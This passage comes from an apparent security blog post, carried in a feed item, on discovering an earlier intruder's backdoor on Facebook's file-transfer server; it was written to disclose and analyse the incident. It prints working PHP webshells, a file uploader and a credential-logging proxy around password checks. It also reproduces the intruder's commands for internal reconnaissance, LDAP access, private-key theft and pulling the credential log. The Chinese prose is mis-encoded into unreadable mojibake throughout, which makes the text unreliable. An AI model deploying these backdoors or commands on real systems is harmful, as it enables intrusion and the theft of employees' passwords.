è·Ÿéš¨éŒ¯èª¤è¨Šæ¯çš„è·¯å¾‘å»çœ‹ç™¼ç¾ç–‘ä¼¼å‰äººç•™ä¸‹çš„ Webshell å¾Œé–€&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
&lt;em&gt;â†‘ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­å¹¾å€‹æª”æ¡ˆçš„å…§å®¹å¦‚ä¸‹&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ²’éŒ¯ï¼Œå°±æ˜¯é‚£å€‹ &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f][&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;], basename(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES[&quot;f&quot;][&quot;name&quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/remote.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sclient_user_class_standard.inc.orig&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// çœç•¥...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y-m-d H:i:s T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_USER_AGENT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;POST=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;GET=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;COOKIE=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// çœç•¥...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å‰å¹¾å€‹å°±æ˜¯å¾ˆæ¨™æº–çš„ PHP ä¸€å¥è©±æœ¨é¦¬&lt;br /&gt;
å…¶ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ â€œ&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;â€ é€™å€‹æª”æ¡ˆ&lt;/p&gt;

&lt;p&gt;include_once ä¸­ â€œ&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;â€ ç‚ºåŸæœ¬å°å¯†ç¢¼é€²è¡Œé©—è­‰çš„ PHP ç¨‹å¼ï¼Œé§­å®¢åšäº†ä¸€å€‹ Proxy åœ¨ä¸­é–“ä¸¦åœ¨é€²è¡Œä¸€äº›é‡è¦æ“ä½œæ™‚å…ˆæŠŠ GET, POST, COOKIE çš„å€¼è¨˜éŒ„èµ·ä¾†&lt;/p&gt;

&lt;p&gt;æ•´ç†ä¸€ä¸‹ï¼Œé§­å®¢åšäº†ä¸€å€‹ Proxy åœ¨å¯†ç¢¼é©—è­‰çš„åœ°æ–¹ï¼Œä¸¦ä¸”è¨˜éŒ„ Facebook å“¡å·¥çš„å¸³è™Ÿå¯†ç¢¼ï¼Œä¸¦ä¸”å°‡è¨˜éŒ„åˆ°çš„å¯†ç¢¼æ”¾ç½®åœ¨ Web ç›®éŒ„ä¸‹ï¼Œé§­å®¢æ¯éš”ä¸€æ®µæ™‚é–“ä½¿ç”¨   wget æŠ“å–&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾ç´€éŒ„è£¡é¢å¯ä»¥çœ‹åˆ°é™¤äº†ä½¿ç”¨è€…å¸³è™Ÿå¯†ç¢¼å¤–ï¼Œé‚„æœ‰å¾ FTA è¦æ±‚æª”æ¡ˆæ™‚çš„ä¿¡ä»¶å…§å®¹ï¼Œè¨˜éŒ„åˆ°çš„å¸³è™Ÿå¯†ç¢¼æœƒå®šæ™‚ Rotate (å¾Œæ–‡æœƒæåŠï¼Œé€™é»é‚„æ»¿æ©Ÿè»Šçš„XD)&lt;/p&gt;

&lt;p&gt;ç™¼ç¾ç•¶ä¸‹ï¼Œæœ€è¿‘ä¸€æ¬¡çš„ Rotate å¾ 2/1 è¨˜éŒ„åˆ° 2/7 å…±ç´„ 300 ç­†å¸³è™Ÿå¯†ç¢¼ç´€éŒ„ï¼Œå¤§å¤šéƒ½æ˜¯ â€œ&lt;strong&gt;@fb.com&lt;/strong&gt;â€ æˆ–æ˜¯ â€œ&lt;strong&gt;@facebook.com&lt;/strong&gt;â€ çš„å“¡å·¥å¸³å¯†ï¼Œçœ‹åˆ°ç•¶ä¸‹è¦ºå¾—äº‹æƒ…æœ‰é»åš´é‡äº†ï¼Œåœ¨ FTA ä¸­ï¼Œä½¿ç”¨è€…çš„ç™»å…¥ä¸»è¦æœ‰å…©ç¨®æ¨¡å¼&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸€èˆ¬ç”¨æˆ¶è¨»å†Šï¼Œå¯†ç¢¼ Hash å­˜åœ¨è³‡æ–™åº«ï¼Œç”± SHA256 + SALT å„²å­˜&lt;/li&gt;
  &lt;li&gt;Facebook å“¡å·¥ (@fb.com) å‰‡èµ°çµ±ä¸€èªè­‰ï¼Œä½¿ç”¨ LDAP ç”± AD èªè­‰&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨é€™è£¡ç›¸ä¿¡è¨˜éŒ„åˆ°çš„æ˜¯çœŸå¯¦çš„å“¡å·¥å¸³è™Ÿå¯†ç¢¼ï¼Œ&lt;strong&gt;**çŒœæ¸¬&lt;/strong&gt;** é€™ä»½å¸³è™Ÿå¯†ç¢¼æ‡‰è©²å¯ä»¥é€šè¡Œ Facebook Mail OWA, VPN ç­‰æœå‹™åšæ›´é€²ä¸€æ­¥çš„æ»²é€â€¦&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œé€™å â€œé§­å®¢â€ å¯èƒ½ç¿’æ…£ä¸å¤ªå¥½ :P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å¾Œé–€åƒæ•¸çš†ä½¿ç”¨ GET ä¾†å‚³éï¼Œåœ¨ç¶²é æ—¥èªŒå¯ä»¥å¾ˆæ˜é¡¯çš„ç™¼ç¾ä»–çš„è¶³è·¡&lt;/li&gt;
  &lt;li&gt;é§­å®¢åœ¨é€²è¡Œä¸€äº›æŒ‡ä»¤æ“ä½œæ™‚æ²’é¡§æ…®åˆ° STDERR ï¼Œå°è‡´ç¶²é æ—¥èªŒä¸­å¾ˆå¤šæŒ‡ä»¤çš„éŒ¯èª¤è¨Šæ¯ï¼Œå¾ä¸­å¯ä»¥è§€å¯Ÿé§­å®¢åšäº†å“ªäº›æ“ä½œ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;
å¾ access.log å¯ä»¥è§€å¯Ÿåˆ°çš„æ¯éš”æ•¸æ—¥é§­å®¢æœƒå°‡è¨˜éŒ„åˆ°çš„å¸³è™Ÿå¯†ç¢¼æ¸…ç©º&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&apos; 2&amp;gt;/dev/stdout HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æ‰“åŒ…æª”æ¡ˆ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp_list3_2 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;2&amp;gt;/dev/stdout
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czvf&lt;/span&gt; files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å°å…§éƒ¨ç¶²è·¯çµæ§‹é€²è¡Œæ¢æ¸¬&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;p&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;for i in &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &quot;192.168.&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&quot;; done; done&apos; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨ Shell Script é€²è¡Œå…§ç¶²æƒæä½†å¿˜è¨˜æŠŠ STDERR å°æ‰XD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å˜—è©¦å°å…§éƒ¨ LDAP é€²è¡Œé€£æ¥&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&apos;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &apos;********&apos; -s base (objectclass=*) 2&amp;gt;/dev/stdout&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å˜—è©¦è¨ªå•å…§éƒ¨ç¶²è·¯è³‡æº&lt;br /&gt;
( çœ‹èµ·ä¾† Mail OWA å¯ä»¥ç›´æ¥è¨ªå• â€¦)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&apos;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&apos; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å˜—è©¦å° SSL Private Key ä¸‹æ‰‹&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾ç€è¦½å™¨è§€å¯Ÿ files.fb.com çš„æ†‘è­‰é‚„æ˜¯ Wildcard çš„ *.fb.com â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;å¾Œè¨˜&quot;&gt;å¾Œè¨˜&lt;/h3&gt;

&lt;p&gt;åœ¨æ”¶é›†å®Œè¶³å¤ è­‰æ“šå¾Œä¾¿ç«‹å³å›å ±çµ¦ Facebook å®‰å…¨åœ˜éšŠï¼Œå›å ±å…§å®¹é™¤äº†æ¼æ´ç´°ç¯€å¤–ï¼Œé‚„é™„ä¸Šç›¸å°æ‡‰çš„ Log ã€æˆªåœ–ä»¥åŠæ™‚é–“ç´€éŒ„xD&lt;/p&gt;

&lt;p&gt;å¾ä¼ºæœå™¨ä¸­çš„æ—¥èªŒå¯ä»¥ç™¼ç¾æœ‰å…©å€‹æ™‚é–“é»æ˜¯æ˜é¡¯é§­å®¢åœ¨æ“ä½œç³»çµ±çš„æ™‚é–“ï¼Œä¸€å€‹æ˜¯ä¸ƒæœˆåˆã€å¦å€‹æ˜¯ä¹æœˆä¸­æ—¬&lt;/p&gt;

&lt;p&gt;ä¸ƒæœˆåˆçš„å‹•ä½œå¾ç´€éŒ„ä¸­ä¾†çœ‹èµ·ä¾†æ¯”è¼ƒåå‘ â€œé€›â€ ä¼ºæœå™¨ï¼Œä½†ä¹æœˆä¸­æ—¬çš„æ“ä½œå°±æ¯”è¼ƒæƒ¡æ„äº†ï¼Œé™¤äº†é€›è¡—å¤–ï¼Œé‚„æ”¾ç½®äº†å¯†ç¢¼ Logger ç­‰ï¼Œè‡³æ–¼å…©å€‹æ™‚é–“é»çš„ â€œé§­å®¢â€ æ˜¯ä¸æ˜¯åŒä¸€å€‹äººå°±ä¸å¾—è€ŒçŸ¥äº† :P&lt;br /&gt;
è€Œä¸ƒæœˆç™¼ç”Ÿçš„æ™‚æ©Ÿé»æ­£å¥½æ¥è¿‘ CVE-2015-2857 Exploit å…¬ä½ˆå‰ï¼Œç©¶ç«Ÿæ˜¯é€é 1-Day é‚„æ˜¯ç„¡ 0-Day å…¥ä¾µç³»çµ±ä¹Ÿç„¡å¾å¾—çŸ¥äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;é€™ä»¶äº‹æƒ…å°±è¨˜éŒ„åˆ°é€™è£¡ï¼Œç¸½é«”ä¾†èªªé€™æ˜¯ä¸€å€‹éå¸¸æœ‰è¶£çš„ç¶“æ­·xD&lt;br /&gt;
ä¹Ÿè®“æˆ‘æœ‰é€™å€‹æ©Ÿæœƒå¯ä»¥ä¾†å¯«å¯«é—œæ–¼æ»²é€çš„ä¸€äº›æ–‡ç«  :P&lt;/p&gt;

&lt;p&gt;æœ€å¾Œä¹Ÿæ„Ÿè¬ Bug Bounty åŠèƒ¸è¥Ÿå¯¬é—Šçš„ Facebook å®‰å…¨åœ˜éšŠ è®“æˆ‘å¯ä»¥å®Œæ•´è¨˜éŒ„é€™èµ·äº‹ä»¶ : )&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 æä¾›æ¼æ´è©³æƒ…çµ¦ Facebook å®‰å…¨åœ˜éšŠ&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 æ”¶åˆ°æ©Ÿå™¨äººè‡ªå‹•å›è¦†&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 æä¾›å¼±é» Advisory çµ¦ Accellion æŠ€è¡“çª—å£&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 æ”¶åˆ° Thomas çš„å›è¦†ï¼Œå‘ŠçŸ¥èª¿æŸ¥ä¸­&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 æ”¶åˆ° Reginaldo çš„å›è¦†ï¼Œå‘ŠçŸ¥ Bug Bounty çé‡‘ $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 è©¢å•æ˜¯å¦æ’°å¯« Blog æ˜¯å¦æœ‰ä»»ä½•è¦æ³¨æ„çš„åœ°æ–¹?&lt;/li&gt;
  &lt;li&gt;2016/02/13 è©¢å•æ­¤æ¼æ´è¢«èªç‚ºæ˜¯ RCE é‚„æ˜¯ SQL Injection&lt;/li&gt;
  &lt;li&gt;2016/02/18 æ”¶åˆ° Reginaldo çš„å›è¦†ï¼Œå‘ŠçŸ¥æ­£åœ¨é€²è¡Œèª¿æŸ¥ä¸­ï¼Œå¸Œæœ› Blog å…ˆæš«æ™‚ä¸è¦ç™¼å‡º&lt;/li&gt;
  &lt;li&gt;2016/02/24 æ”¶åˆ° Hai çš„å›è¦†ï¼Œå‘ŠçŸ¥çé‡‘å°‡æœƒæ–¼ä¸‰æœˆç™¼é€&lt;/li&gt;
  &lt;li&gt;2016/04/20 æ”¶åˆ° Reginaldo çš„å›è¦†ï¼Œå‘ŠçŸ¥èª¿æŸ¥å·²å®Œæˆ&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</link>
